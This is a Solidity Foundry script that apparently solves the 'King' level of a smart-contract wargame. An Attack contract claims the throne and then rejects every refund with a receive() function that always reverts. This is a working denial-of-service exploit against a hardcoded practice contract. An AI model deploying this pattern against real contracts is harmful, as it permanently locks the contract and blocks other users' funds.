// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/Level09.sol";

contract Attack {
    constructor(King _instance) payable {
        (bool success,) = payable(address(_instance)).call{value: msg.value}("");
        require(success, "Failed to claim throne");
    }

    receive() external payable {
        require(false, "Not allowed to claim throne");
    }
}

contract KingScript is Script {
    King public kingInstance;

    function setUp() public {
        kingInstance = King(payable(0x2Ab2ed89a78b319779c2dc4c1D06396bb7F2624C));
    }

    function run() public {
        vm.startBroadcast();

        uint256 prize = kingInstance.prize();
        new Attack{value: prize}(kingInstance);

        vm.stopBroadcast();
    }
}
